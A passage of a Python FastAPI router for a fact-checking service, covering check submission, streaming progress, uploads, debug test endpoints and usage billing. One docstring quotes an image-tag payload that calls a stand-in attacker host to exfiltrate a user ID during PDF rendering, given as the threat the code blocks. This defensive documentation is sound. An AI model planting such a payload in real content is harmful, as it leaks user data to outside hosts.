from typing import Any, Dict, List, Optional
from fastapi import APIRouter, Depends, HTTPException, UploadFile, File, Form, Request
from fastapi.responses import StreamingResponse, Response
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, desc, func
from pydantic import BaseModel, Field
from jinja2 import Environment, FileSystemLoader, select_autoescape
from app.core.client_origin import resolve_client
from app.core.database import get_session
from app.core.auth import (
    get_current_user,
    get_current_user_sse,
    get_current_user_or_api_key,
    get_current_user_or_api_key_sse,
)
from app.core.config import settings
from app.core.inflight import inflight_register, inflight_unregister
from app.core.watchdog import supervise_pipeline_task, supervise_re_search_task
from app.core.pdf_assets import FONT_FACE_CSS
from app.pipeline.support_structure import side_quality_note
from app.models import User, Check, Claim, Evidence, RawEvidence, Subscription
from datetime import datetime, timezone
import re
import uuid
import json
import copy
import asyncio
import logging
import secrets
import redis.asyncio as aioredis
import redis
from app.core.config import settings
import os
import aiofiles
from app.api.v1.users import get_or_create_user
from app.services.storage import storage_service
from app.services.usage_ledger import (
    enforce_usage_limit,
    record_usage,
    reserve_usage,
)
from app.core.rate_limit import limiter
from app.utils.encoding import fix_mojibake
from pathlib import Path

# Response builder (extracted L-03) — shared with agent.py
from app.api.v1.response_builder import (
    _sanitize_strings,
    _claim_map_to_camel_case,
    _convert_element,
    _serialize_evidence,
    build_check_response,
)

# OpenAPI schemas for documentation
from app.api.v1.schemas import (
    CheckResponse,
    CheckListResponse,
    SourcesResponse,
    BountyUpdateResponse,
    ResearchStartResponse,
    ResearchStatusResponse,
    SSETokenResponse,
    VideosResponse,
    PublicCheckMinimal,
    ErrorResponse,
    CreditLimitError,
    PipelineErrorResponse,
    TimeoutErrorResponse,
)

logger = logging.getLogger(__name__)

# Strong references for fire-and-forget tasks (video recs, archiving).
# Without this, asyncio.create_task() tasks can be garbage collected
# before completion when spawned inside SSE streaming generators.
_background_tasks: set = set()

router = APIRouter()


# Setup Jinja2 environment for PDF templates
template_dir = Path(__file__).parent.parent.parent / "templates"
jinja_env = Environment(
    loader=FileSystemLoader(str(template_dir)),
    autoescape=select_autoescape(["html", "xml"]),
)


def _block_pdf_network_fetch(url: str, timeout: int = 10, ssl_context=None):
    """F-SEC-05: block WeasyPrint from fetching external resources at PDF
    render time. Stops poisoned claim text with `<img src="http://attacker/?u={{user_id}}">`
    from exfiltrating user data via image fetches.

    ``data:`` URIs are permitted: they are self-contained (no network request,
    no filesystem access) and are how the brand fonts are embedded
    (`app.core.pdf_assets`). Everything else is refused. Claim/evidence text is
    Jinja-autoescaped, so an attacker cannot inject a `data:` URI of their own."""
    if url.startswith("data:"):
        from weasyprint import default_url_fetcher

        return default_url_fetcher(url, timeout, ssl_context)
    raise ValueError(f"PDF rendering may not fetch external resources (blocked: {url})")


def safe_json_dumps(data: dict) -> str:
    """Safely serialize JSON for SSE with ASCII encoding and mojibake fix."""
    data = _sanitize_strings(data)
    return json.dumps(data, ensure_ascii=True, separators=(",", ":"))


def _require_console_submission(request: Request) -> str:
    """Reject programmatic (API-key) submission on the Console /checks endpoints.

    Console check submission is for signed-in users (Clerk JWT) and the SSE
    stream token only. Programmatic callers must use the metered /agent
    endpoints, which bill against the prepaid credit balance — otherwise an API
    key could ride the human subscription's fair-use quota. This is the
    two-product boundary: Console = /checks = sign-in; API = /agent = metered.
    Read-only /checks endpoints still accept API keys; only submission is walled.

    Keys off the resolved auth method (set on request.state by the dual-auth
    dependency), with the X-API-Key header as a belt-and-braces fallback.

    Returns the initiated_via tag ("dashboard") for the created Check.
    """
    auth_method = getattr(request.state, "auth_method", None)
    if auth_method == "api_key" or request.headers.get("X-API-Key"):
        raise HTTPException(
            status_code=403,
            detail=(
                "This endpoint is for signed-in Console users. Programmatic / agent "
                "access uses the metered /agent endpoints (see /developers)."
            ),
        )
    return "dashboard"


async def _validate_and_create_check(
    body,
    current_user: dict,
    session: AsyncSession,
    initiated_via: str = "dashboard",
    client: Optional[str] = None,
) -> tuple:
    """Validate input, enforce credits, and create a Check record.

    Shared by POST /stream and POST /run. Returns (user, check) on success
    or raises HTTPException (402 credits exhausted, 400/403 bad input).
    """
    # Get or create user (handles race conditions)
    user = await get_or_create_user(session, current_user)

    # USAGE LIMIT CHECK — ledger-backed; locks the user row so the gate and
    # the debit below commit atomically (admins bypass the limit, not the
    # debit; DEBUG must NOT bypass limits in production).
    user = await enforce_usage_limit(session, user, context="checks")

    # Validate input
    if body.input_type not in ["url", "text", "image", "video"]:
        raise HTTPException(status_code=400, detail="Invalid input type")

    if body.input_type == "url" and not body.url:
        raise HTTPException(
            status_code=400, detail="URL is required for url input type"
        )

    if body.input_type in ["url", "video"] and body.url:
        if not body.url.startswith(("http://", "https://")):
            body.url = f"https://{body.url}"

    if body.input_type == "text" and not body.content:
        raise HTTPException(
            status_code=400, detail="Content is required for text input type"
        )

    if body.input_type == "image" and not body.file_path:
        raise HTTPException(
            status_code=400, detail="File path is required for image input type"
        )

    if body.input_type == "video" and not body.url:
        raise HTTPException(
            status_code=400, detail="URL is required for video input type"
        )

    # Sanitize inputs
    if body.url:
        body.url = body.url.strip()
    if body.content:
        body.content = body.content.strip()

    # Search Clarity validation
    if body.user_query:
        if not settings.ENABLE_SEARCH_CLARITY:
            raise HTTPException(
                status_code=503, detail="Search Clarity feature is temporarily disabled"
            )
        if len(body.user_query) > 200:
            raise HTTPException(
                status_code=400, detail="Query must be 200 characters or less"
            )
        body.user_query = body.user_query.strip()

    # Create check record
    check = Check(
        id=str(uuid.uuid4()),
        user_id=user.id,
        input_type=body.input_type,
        input_content=json.dumps(
            {"content": body.content, "url": body.url, "file_path": body.file_path}
        ),
        input_url=body.url,
        status="processing",
        credits_used=1,
        user_query=body.user_query,
        initiated_via=initiated_via,
        client=client,  # first-party client attribution (e.g. "mcp")
        executed_tier="full",  # M-03: dashboard always runs full pipeline
    )

    session.add(check)

    # Flush the Check INSERT before appending the FK'd ledger event: without
    # a relationship() the unit of work does NOT order inserts across mappers
    # by raw FK columns, and Postgres emitted usage_events before "check"
    # (FK violation → 500 on every submission; Sentry PYTHON-FASTAPI-2F).
    # Same transaction, so the row lock from enforce_usage_limit still holds.
    await session.flush()

    # Debit the usage ledger (+ legacy counters) in the same transaction as
    # the Check row — the lock from enforce_usage_limit covers both.
    record_usage(session, user, kind="check", check_id=check.id)
    await session.commit()
    await session.refresh(check)

    return user, check


async def _build_check_response(
    check_id: str,
    user_id: str,
    session: AsyncSession,
    computed: bool = False,
) -> dict:
    """Delegates to shared response builder (extracted L-03)."""
    return await build_check_response(check_id, user_id, session, computed)


class CreateCheckRequest(BaseModel):
    """Submit content for evidence research."""

    input_type: str = Field(
        description="Input type: 'url' (article analysis), 'text' (direct claim), 'image' (OCR), or 'video' (transcript)"
    )
    content: Optional[str] = Field(
        None,
        max_length=10_000,
        description="Claim text (required when input_type is 'text'). Supports both statements and questions. Capped at 10,000 chars to prevent DoS via oversized inputs.",
    )
    url: Optional[str] = Field(
        None,
        max_length=2048,
        description="URL to analyse (required when input_type is 'url' or 'video'). HTTPS prefix is added automatically if omitted.",
    )
    file_path: Optional[str] = Field(
        None, description="Server path for uploaded images (use POST /upload first)"
    )
    user_query: Optional[str] = Field(
        None,
        description="Optional Search Clarity question (max 200 chars). When provided, the pipeline generates a focused answer alongside the evidence landscape.",
    )
    frozen_evidence: Optional[Dict[str, List[Dict[str, Any]]]] = Field(
        None,
        description="Pre-supplied evidence for replay testing (internal use only)",
    )


@router.post("/upload")
@limiter.limit("10/minute")  # Rate limit uploads
async def upload_file(
    request: Request,  # Required for rate limiting
    file: UploadFile = File(...),
    current_user: dict = Depends(get_current_user),  # JWT only — human dashboard action
):
    """Upload a file for fact-checking (images only)"""

    # Validate file type
    if not file.content_type or not file.content_type.startswith("image/"):
        raise HTTPException(status_code=400, detail="Only image files are supported")

    # Check file size (6MB limit from project requirements)
    max_size = 6 * 1024 * 1024  # 6MB
    content = await file.read()
    if len(content) > max_size:
        raise HTTPException(
            status_code=413, detail="File too large. Maximum size is 6MB."
        )

    # Generate unique filename
    file_id = str(uuid.uuid4())
    file_extension = Path(file.filename).suffix.lower()
    if file_extension not in [".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp"]:
        raise HTTPException(
            status_code=400,
            detail="Unsupported image format. Supported: jpg, jpeg, png, gif, bmp, webp",
        )

    filename = f"{file_id}{file_extension}"

    try:
        # Use storage service (S3 in production, local in development)
        file_path = await storage_service.upload(
            file_data=content,
            filename=filename,
            content_type=file.content_type,
        )

        return {
            "success": True,
            "filePath": file_path,
            "filename": file.filename,
            "contentType": file.content_type,
            "size": len(content),
        }

    except Exception as e:
        logger.error(f"File upload error: {e}")
        raise HTTPException(status_code=500, detail="Failed to save uploaded file")


@router.get("/test/stream-mock", status_code=200, include_in_schema=False)
async def test_stream_mock():
    """
    Mock streaming endpoint for testing SSE mechanism.
    DEBUG mode only. Returns fake progress events.
    """
    if not settings.DEBUG:
        raise HTTPException(
            status_code=404, detail="Test endpoint only available in DEBUG mode"
        )

    from app.pipeline.progress import ProgressReporter

    check_id = str(uuid.uuid4())
    reporter = ProgressReporter(check_id)

    async def mock_pipeline():
        """Simulate pipeline stages with delays."""
        stages = [
            "ingest",
            "extract",
            "select",
            "decompose",
            "retrieve",
            "analyze",
            "complete",
        ]
        for stage in stages:
            await asyncio.sleep(1)  # Simulate work
            await reporter.report_progress(stage)
        await asyncio.sleep(0.5)
        await reporter.report_completed()

    async def mock_stream():
        task = asyncio.create_task(mock_pipeline())
        async for event in reporter.events(task):
            yield event
        await task

    return StreamingResponse(
        mock_stream(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Check-Id": check_id,
        },
    )


@router.get("/test/{check_id}", include_in_schema=False)
async def get_check_test(check_id: str, session: AsyncSession = Depends(get_session)):
    """TEST-ONLY ENDPOINT: Get check status without authentication (DEBUG mode only)"""
    if not settings.DEBUG:
        raise HTTPException(
            status_code=404, detail="Test endpoint only available in DEBUG mode"
        )

    try:
        # Get check from database
        stmt = select(Check).where(Check.id == check_id)
        result = await session.execute(stmt)
        check = result.scalar_one_or_none()

        if not check:
            raise HTTPException(status_code=404, detail="Check not found")

        # Build basic response
        response = {
            "id": check.id,
            "status": check.status,
            "inputType": check.input_type,
            "inputUrl": check.input_url,
            "createdAt": check.created_at.isoformat() if check.created_at else None,
            "creditsUsed": check.credits_used or 0,
        }

        # If completed, add results
        if check.status == "completed":
            try:
                # Get claims for this check
                claims_stmt = select(Claim).where(Claim.check_id == check_id)
                claims_result = await session.execute(claims_stmt)
                claims = list(claims_result.scalars().all())

                # Calculate statistics
                total_claims = len(claims)
                selected_claims = sum(1 for c in claims if c.is_selected)

                response.update(
                    {
                        "claims_analyzed": total_claims,
                        "selected_claims": selected_claims,
                    }
                )
            except Exception as e:
                logger.error(f"[TEST] Error getting claims for check {check_id}: {e}")
                # Return basic response without claims data
                pass

        # If failed, add error
        if check.status == "failed":
            response["error"] = check.error_message or "Unknown error"

        return response

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"[TEST] Error in get_check_test for {check_id}: {e}")
        import traceback

        logger.error(traceback.format_exc())
        raise HTTPException(status_code=500, detail=f"Internal server error: {str(e)}")


class CreateCheckTestStreamRequest(BaseModel):
    """Test-only request for streaming endpoint"""

    input_type: str = "text"
    content: Optional[str] = None
    url: Optional[str] = None


@router.post("/test/stream", status_code=200, include_in_schema=False)
async def create_check_test_streaming(
    body: CreateCheckTestStreamRequest, session: AsyncSession = Depends(get_session)
):
    """
    TEST-ONLY ENDPOINT: Create a streaming fact-check without authentication.
    DEBUG mode only. Uses test user with unlimited credits.

    Example:
        curl -N -X POST http://localhost:8000/api/v1/checks/test/stream \\
          -H "Content-Type: application/json" \\
          -d '{"input_type": "text", "content": "The Earth is flat."}'
    """
    if not settings.DEBUG:
        raise HTTPException(
            status_code=404, detail="Test endpoint only available in DEBUG mode"
        )

    from app.core.database import async_session
    from app.pipeline.progress import ProgressReporter
    from app.pipeline.runner import (
        run_pipeline,
        save_check_results_async,
        handle_pipeline_failure,
        send_success_notifications,
        PipelineError,
    )

    # Create or get test user
    test_user_id = "test-user-streaming"
    stmt = select(User).where(User.id == test_user_id)
    result = await session.execute(stmt)
    user = result.scalar_one_or_none()

    if not user:
        user = User(
            id=test_user_id,
            email="test-stream@consistency.local",
            name="Streaming Test User",
            credits=1000000,
        )
        session.add(user)
        await session.commit()
        await session.refresh(user)

    # Normalize URL if provided
    if body.input_type == "url" and body.url:
        if not body.url.startswith(("http://", "https://")):
            body.url = f"https://{body.url}"

    # Validate
    if body.input_type == "text" and not body.content:
        raise HTTPException(status_code=400, detail="Content required for text input")
    if body.input_type == "url" and not body.url:
        raise HTTPException(status_code=400, detail="URL required for url input")

    # Create check record
    check = Check(
        id=str(uuid.uuid4()),
        user_id=user.id,
        input_type=body.input_type,
        input_content=json.dumps(
            {"content": body.content, "url": body.url, "file_path": None}
        ),
        input_url=body.url,
        status="processing",
        credits_used=0,  # Don't charge for test
        user_query=None,
    )

    session.add(check)
    await session.commit()
    await session.refresh(check)

    logger.info(f"[TEST STREAM] Created check {check.id}")

    # Prepare input data
    input_data = {
        "input_type": body.input_type,
        "content": body.content,
        "url": body.url,
        "file_path": None,
        "user_query": None,
    }

    progress_reporter = ProgressReporter(check.id)

    async def run_pipeline_and_save():
        """Background task that runs pipeline and saves results independently."""
        inflight_register(check.id)  # deploy-shutdown guard (2026-07-21)
        try:
            logger.info(f"[TEST STREAM] Starting pipeline for check {check.id}")
            result = await asyncio.wait_for(
                run_pipeline(check.id, user.id, input_data, progress_reporter),
                timeout=300,
            )

            # result is None for article mode (waiting_for_selection)
            if result is not None:
                async with async_session() as save_session:
                    await save_check_results_async(check.id, result, save_session)
                    await save_session.commit()

                await progress_reporter.report_completed()
                logger.info(f"[TEST STREAM] Check {check.id} completed successfully")
            else:
                logger.info(
                    f"[TEST STREAM] Check {check.id} paused — waiting for claim selection"
                )

        except asyncio.TimeoutError:
            logger.error(f"[TEST STREAM] Pipeline timed out for check {check.id}")
            await handle_pipeline_failure(
                check.id, user.id, Exception("Pipeline timed out")
            )
            await progress_reporter.report_error("Pipeline timed out")

        except PipelineError as e:
            logger.error(f"[TEST STREAM] Pipeline error: {e}")
            await handle_pipeline_failure(check.id, user.id, e)
            await progress_reporter.report_error(str(e))

        except Exception as e:
            logger.error(f"[TEST STREAM] Unexpected error: {e}")
            import traceback

            logger.error(traceback.format_exc())
            await handle_pipeline_failure(check.id, user.id, e)
            await progress_reporter.report_error(str(e))

        finally:
            inflight_unregister(check.id)

    # Start pipeline as a supervised background task (hang-proofing W1)
    pipeline_task = supervise_pipeline_task(
        run_pipeline_and_save(),
        check_id=check.id,
        user_id=user.id,
        label="test-stream pipeline",
    )

    async def pipeline_stream():
        """Generator that yields SSE events - pipeline runs independently."""
        async for event in progress_reporter.events(
            pipeline_task, max_duration_seconds=300
        ):
            yield event

    return StreamingResponse(
        pipeline_stream(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
            "X-Check-Id": check.id,
        },
    )


@router.post(
    "/stream",
    status_code=200,
    summary="Submit content for evidence research (SSE stream)",
    responses={
        200: {
            "description": "Server-Sent Events stream of pipeline progress. Content-Type: text/event-stream"
        },
        400: {"description": "Invalid input", "model": ErrorResponse},
        402: {"description": "Monthly credit limit reached", "model": CreditLimitError},
    },
)
@limiter.limit("10/minute")
async def create_check_streaming(
    body: CreateCheckRequest,
    request: Request,
    current_user: dict = Depends(get_current_user_or_api_key_sse),
    session: AsyncSession = Depends(get_session),
):
    """
    Submit a URL or text for evidence research. Returns an SSE stream of
    pipeline progress events.

    **Input types:** `url` (article analysis), `text` (direct claim or question).

    Deep Research pipeline: extract claims → retrieve evidence → decompose
    into elements → map evidence with relationship labels (typically 60-120s).

    **SSE events emitted:**
    - `progress` — stage name, percentage, time estimate
    - `awaiting_selection` — article mode: claims extracted, awaiting user selection
    - `completed` — pipeline finished, check ID in payload
    - `error` — pipeline failed

    For URL inputs with multiple claims, the pipeline pauses after extraction.
    Call `PATCH /checks/{id}/select-claims` to resume with chosen claims.

    **Rate limit:** 10/minute
    """
    from app.core.database import async_session
    from app.pipeline.progress import ProgressReporter
    from app.pipeline.runner import (
        run_pipeline,
        save_check_results_async,
        handle_pipeline_failure,
        send_success_notifications,
        PipelineError,
    )

    via = _require_console_submission(request)
    user, check = await _validate_and_create_check(
        body, current_user, session, initiated_via=via, client=resolve_client(request)
    )

    # Prepare input data for pipeline
    input_data = {
        "input_type": body.input_type,
        "content": body.content,
        "url": body.url,
        "file_path": body.file_path,
        "user_query": body.user_query,
        "frozen_evidence": body.frozen_evidence,
    }

    # Create progress reporter
    progress_reporter = ProgressReporter(check.id)

    def _fire_webhook_failed(uid: str, cid: str, error_msg: str):
        """Best-effort webhook dispatch for check.failed events."""
        try:
            from app.services.webhooks import dispatch_webhook_event

            asyncio.create_task(
                dispatch_webhook_event(
                    uid,
                    "check.failed",
                    {"checkId": cid, "status": "failed", "error": error_msg},
                )
            )
        except Exception:
            pass

    async def run_pipeline_and_save():
        """
        Background task that runs the pipeline and saves results.
        This runs INDEPENDENTLY of the SSE stream - results are saved
        even if the client disconnects.
        """
        inflight_register(check.id)  # deploy-shutdown guard (2026-07-21)
        try:
            logger.info(f"[PIPELINE TASK] Starting pipeline for check {check.id}")
            result = await asyncio.wait_for(
                run_pipeline(check.id, user.id, input_data, progress_reporter),
                timeout=300,  # 5 minute hard timeout
            )

            # result is None for article mode (waiting_for_selection)
            if result is not None:
                logger.info(f"[PIPELINE TASK] Pipeline completed for check {check.id}")

                # Save results to database
                async with async_session() as save_session:
                    await save_check_results_async(check.id, result, save_session)
                    await save_session.commit()
                logger.info(f"[PIPELINE TASK] Results saved for check {check.id}")

                # Fire-and-forget video recommendations (E14)
                try:
                    from app.services.video_recommendations import (
                        fetch_video_recommendations,
                    )

                    # Claims are saved to DB — query for their IDs
                    async with async_session() as video_session:
                        db_claims_result = await video_session.execute(
                            select(Claim)
                            .where(Claim.check_id == check.id)
                            .where(Claim.is_selected == True)
                        )
                        db_claims = db_claims_result.scalars().all()
                        if not db_claims:
                            # Fallback: all claims (focused mode)
                            db_claims_result = await video_session.execute(
                                select(Claim).where(Claim.check_id == check.id)
                            )
                            db_claims = db_claims_result.scalars().all()
                        claims_for_videos = [
                            {"id": c.id, "text": c.text} for c in db_claims
                        ]

                    if claims_for_videos:
                        task = asyncio.create_task(
                            fetch_video_recommendations(check.id, claims_for_videos)
                        )
                        _background_tasks.add(task)
                        task.add_done_callback(_background_tasks.discard)
                        logger.info(
                            f"[PIPELINE TASK] Video recommendations task launched "
                            f"for {len(claims_for_videos)} claims"
                        )
                except Exception as ve:
                    logger.debug(f"[PIPELINE TASK] Video recommendations skipped: {ve}")

                # Fire-and-forget URL archiving (F10)
                try:
                    from app.services.wayback_archive import archive_evidence_urls

                    task = asyncio.create_task(archive_evidence_urls(check.id))
                    _background_tasks.add(task)
                    task.add_done_callback(_background_tasks.discard)
                    logger.info(
                        f"[PIPELINE TASK] Archive task launched for check {check.id}"
                    )
                except Exception as ae:
                    logger.debug(f"[PIPELINE TASK] Archiving skipped: {ae}")

                # Send success notifications
                content_data = {"metadata": result.get("ingest_metadata", {})}
                await send_success_notifications(
                    user.id, check.id, result, input_data, content_data
                )

                # Signal completion
                await progress_reporter.report_completed()
                logger.info(f"[PIPELINE TASK] Check {check.id} fully completed")

                # Fire webhook: check.completed
                try:
                    from app.services.webhooks import dispatch_webhook_event

                    asyncio.create_task(
                        dispatch_webhook_event(
                            user.id,
                            "check.completed",
                            {
                                "checkId": check.id,
                                "status": "completed",
                                "processingTimeMs": result.get("processing_time_ms"),
                                "claimsCount": len(result.get("claims", [])),
                            },
                        )
                    )
                except Exception as we:
                    logger.debug(f"[PIPELINE TASK] Webhook dispatch skipped: {we}")
            else:
                logger.info(
                    f"[PIPELINE TASK] Check {check.id} phase 1 complete — "
                    f"waiting for claim selection"
                )

        except asyncio.TimeoutError:
            logger.error(f"[PIPELINE TASK] Pipeline timed out for check {check.id}")
            await handle_pipeline_failure(
                check.id, user.id, Exception("Pipeline timed out after 5 minutes")
            )
            await progress_reporter.report_error(
                "Pipeline timed out. Your credit has been returned."
            )
            _fire_webhook_failed(user.id, check.id, "Pipeline timed out")

        except PipelineError as e:
            logger.error(f"[PIPELINE TASK] Pipeline error for check {check.id}: {e}")
            await handle_pipeline_failure(check.id, user.id, e)
            await progress_reporter.report_error(str(e))
            _fire_webhook_failed(user.id, check.id, str(e))

        except Exception as e:
            logger.error(f"[PIPELINE TASK] Unexpected error for check {check.id}: {e}")
            import traceback

            logger.error(traceback.format_exc())
            await handle_pipeline_failure(check.id, user.id, e)
            await progress_reporter.report_error(str(e))
            _fire_webhook_failed(user.id, check.id, str(e))

        finally:
            inflight_unregister(check.id)

    # Start pipeline as a SUPERVISED background task (hang-proofing W1):
    # the wall-clock ceiling lives on the task itself, not the SSE stream —
    # it survives client disconnects. On breach: honest failure + refund.
    pipeline_task = supervise_pipeline_task(
        run_pipeline_and_save(),
        check_id=check.id,
        user_id=user.id,
        label="submission pipeline",
    )
    logger.info(f"[SSE STREAM] Background pipeline task created for check {check.id}")

    async def pipeline_stream():
        """
        Async generator that yields SSE events.
        The actual pipeline runs independently - this just streams events.
        """
        logger.info(f"[SSE STREAM] Starting event stream for check {check.id}")
        event_count = 0

        try:
            async for event in progress_reporter.events(
                pipeline_task, max_duration_seconds=300
            ):
                event_count += 1
                if (
                    event_count <= 5 or event_count % 10 == 0
                ):  # Log first 5 and every 10th
                    logger.info(
                        f"[SSE STREAM] Event #{event_count} for check {check.id}"
                    )
                yield event
        except Exception as e:
            logger.error(
                f"[SSE STREAM] Error streaming events for check {check.id}: {e}"
            )
        finally:
            logger.info(
                f"[SSE STREAM] Stream ended for check {check.id} after {event_count} events"
            )
            # Note: We do NOT cancel the pipeline task here - it should complete independently

    return StreamingResponse(
        pipeline_stream(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
            "X-Check-Id": check.id,  # Include check ID in headers for client
        },
    )


@router.post(
    "/run",
    status_code=200,
    summary="Synchronous evidence research",
    responses={
        200: {
            "description": "Complete evidence landscape with claims, elements, and evidence",
            "model": CheckResponse,
        },
        400: {"description": "Invalid input", "model": ErrorResponse},
        402: {"description": "Monthly credit limit reached", "model": CreditLimitError},
        504: {
            "description": "Pipeline timed out (>180s)",
            "model": TimeoutErrorResponse,
        },
        502: {"description": "Pipeline error", "model": PipelineErrorResponse},
    },
)
@limiter.limit("10/minute")
async def create_check_sync(
    body: CreateCheckRequest,
    request: Request,
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    """
    Synchronous evidence research — single HTTP call, blocks until complete.

    Recommended for agents and scripts. Submit a claim or URL, wait 60-120s,
    receive the full result with claims, elements, evidence, and analytics.
    No SSE, no polling, no claim selection required.

    For URL/article inputs, claims are auto-selected (top-ranked, up to 5).

    **Set your HTTP client timeout to at least 180s.**

    **Rate limit:** 10/minute
    """
    from app.core.database import async_session
    from app.pipeline.progress import ProgressReporter
    from app.pipeline.runner import (
        run_pipeline,
        run_pipeline_phase2,
        save_check_results_async,
        handle_pipeline_failure,
        send_success_notifications,
        PipelineError,
    )

    via = _require_console_submission(request)
    user, check = await _validate_and_create_check(
        body, current_user, session, initiated_via=via, client=resolve_client(request)
    )

    # Prepare input data for pipeline
    input_data = {
        "input_type": body.input_type,
        "content": body.content,
        "url": body.url,
        "file_path": body.file_path,
        "user_query": body.user_query,
        "frozen_evidence": body.frozen_evidence,
    }

    # Create progress reporter (required by runner, writes to Redis — we just don't stream it)
    progress_reporter = ProgressReporter(check.id)

    try:
        result = await asyncio.wait_for(
            run_pipeline(check.id, user.id, input_data, progress_reporter),
            timeout=180,
        )

        # Article mode: result is None → auto-select top-ranked claims, run Phase 2
        if result is None:
            async with async_session() as sel_session:
                claims_stmt = (
                    select(Claim)
                    .where(Claim.check_id == check.id)
                    .order_by(Claim.position)
                )
                claims_result = await sel_session.execute(claims_stmt)
                db_claims = list(claims_result.scalars().all())

                # Select top N by significance rank (lower = more significant)
                ranked = sorted(
                    db_claims,
                    key=lambda c: (
                        c.significance_rank if c.significance_rank is not None else 999
                    ),
                )
                max_selected = getattr(settings, "MAX_SELECTED_CLAIMS", 5)
                for i, claim in enumerate(ranked):
                    claim.is_selected = i < max_selected

                sel_check_stmt = select(Check).where(Check.id == check.id)
                sel_check_result = await sel_session.execute(sel_check_stmt)
                sel_check = sel_check_result.scalar_one()
                sel_check.selected_claims_count = min(len(ranked), max_selected)

                await sel_session.commit()

            logger.info(
                f"[SYNC RUN] Auto-selected {min(len(ranked), max_selected)} claims "
                f"for check {check.id}"
            )

            # Build Phase 2 input
            input_content = (
                json.loads(check.input_content) if check.input_content else {}
            )
            phase2_input = {
                "input_type": check.input_type,
                "content": input_content.get("content"),
                "url": input_content.get("url") or check.input_url,
                "file_path": input_content.get("file_path"),
                "user_query": check.user_query,
            }

            phase2_reporter = ProgressReporter(check.id)
            result = await asyncio.wait_for(
                run_pipeline_phase2(
                    check_id=check.id,
                    user_id=user.id,
                    input_data=phase2_input,
                    progress_reporter=phase2_reporter,
                ),
                timeout=180,
            )

        # Save results to database
        async with async_session() as save_session:
            await save_check_results_async(check.id, result, save_session)
            await save_session.commit()

        logger.info(f"[SYNC RUN] Results saved for check {check.id}")

        # Fire-and-forget post-processing
        try:
            from app.services.video_recommendations import fetch_video_recommendations

            async with async_session() as video_session:
                db_claims_result = await video_session.execute(
                    select(Claim)
                    .where(Claim.check_id == check.id)
                    .where(Claim.is_selected == True)
                )
                db_claims = db_claims_result.scalars().all()
                if not db_claims:
                    db_claims_result = await video_session.execute(
                        select(Claim).where(Claim.check_id == check.id)
                    )
                    db_claims = db_claims_result.scalars().all()
                claims_for_videos = [{"id": c.id, "text": c.text} for c in db_claims]

            if claims_for_videos:
                task = asyncio.create_task(
                    fetch_video_recommendations(check.id, claims_for_videos)
                )
                _background_tasks.add(task)
                task.add_done_callback(_background_tasks.discard)
        except Exception as ve:
            logger.debug(f"[SYNC RUN] Video recommendations skipped: {ve}")

        try:
            from app.services.wayback_archive import archive_evidence_urls

            task = asyncio.create_task(archive_evidence_urls(check.id))
            _background_tasks.add(task)
            task.add_done_callback(_background_tasks.discard)
        except Exception as ae:
            logger.debug(f"[SYNC RUN] Archiving skipped: {ae}")

        # Send notifications (webhook: check.completed)
        content_data = {"metadata": result.get("ingest_metadata", {})}
        await send_success_notifications(
            user.id, check.id, result, input_data, content_data
        )

        try:
            from app.services.webhooks import dispatch_webhook_event

            asyncio.create_task(
                dispatch_webhook_event(
                    user.id,
                    "check.completed",
                    {
                        "checkId": check.id,
                        "status": "completed",
                        "processingTimeMs": result.get("processing_time_ms"),
                        "claimsCount": len(result.get("claims", [])),
                    },
                )
            )
        except Exception:
            pass

        # Build and return the full response (fresh session for committed data)
        async with async_session() as resp_session:
            return await _build_check_response(
                check.id, user.id, resp_session, computed=True
            )

    except asyncio.TimeoutError:
        logger.error(f"[SYNC RUN] Pipeline timed out for check {check.id}")
        await handle_pipeline_failure(
            check.id, user.id, Exception("Pipeline timed out")
        )
        raise HTTPException(
            status_code=504,
            detail="Pipeline timed out. Your credit has been returned.",
        )

    except PipelineError as e:
        logger.error(f"[SYNC RUN] Pipeline error for check {check.id}: {e}")
        await handle_pipeline_failure(check.id, user.id, e)
        raise HTTPException(
            status_code=502,
            detail=f"Pipeline error: {e}",
        )

    except HTTPException:
        raise

    except Exception as e:
        logger.error(f"[SYNC RUN] Unexpected error for check {check.id}: {e}")
        import traceback

        logger.error(traceback.format_exc())
        await handle_pipeline_failure(check.id, user.id, e)
        raise HTTPException(
            status_code=502,
            detail=f"Pipeline error: {e}",
        )


@router.get(
    "",
    summary="List checks",
    responses={
        200: {
            "description": "Paginated list of checks, newest first",
            "model": CheckListResponse,
        },
    },
)
@router.get("/", include_in_schema=False)
async def get_checks(
    skip: int = 0,
    limit: int = 20,
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    """
    List the authenticated user's checks, newest first.

    Returns check metadata (ID, status, input type, claim count, timestamps)
    with a preview of the first claim. Use `GET /checks/{id}` for full
    claim and evidence data.
    """
    # True total count of the user's checks — independent of this page — so the
    # client's "Load More" pagination (hasMore = loaded < total) works. Using
    # len(checks) here capped every user at their first `limit` checks.
    total_stmt = select(func.count(Check.id)).where(Check.user_id == current_user["id"])
    total_result = await session.execute(total_stmt)
    total_count = total_result.scalar() or 0

    stmt = (
        select(Check)
        .where(Check.user_id == current_user["id"])
        .order_by(desc(Check.created_at))
        .offset(skip)
        .limit(limit)
    )
    result = await session.execute(stmt)
    checks = result.scalars().all()

    # Get claims for each check (including first claim for preview)
    check_data = []
    for check in checks:
        # Get first claim for preview (ordered by position)
        first_claim_stmt = (
            select(Claim)
            .where(Claim.check_id == check.id)
            .order_by(Claim.position)
            .limit(1)
        )
        first_claim_result = await session.execute(first_claim_stmt)
        first_claim = first_claim_result.scalar_one_or_none()

        # Count total claims
        claims_count_stmt = select(func.count(Claim.id)).where(
            Claim.check_id == check.id
        )
        claims_count_result = await session.execute(claims_count_stmt)
        claims_count = claims_count_result.scalar() or 0

        # Build claims array with first claim details
        claims_array = []
        if first_claim:
            claim_map_raw = first_claim.claim_map
            if isinstance(claim_map_raw, str):
                claim_map_raw = json.loads(claim_map_raw)
            claim_map = claim_map_raw if claim_map_raw else None
            claims_array.append(
                {
                    "id": first_claim.id,
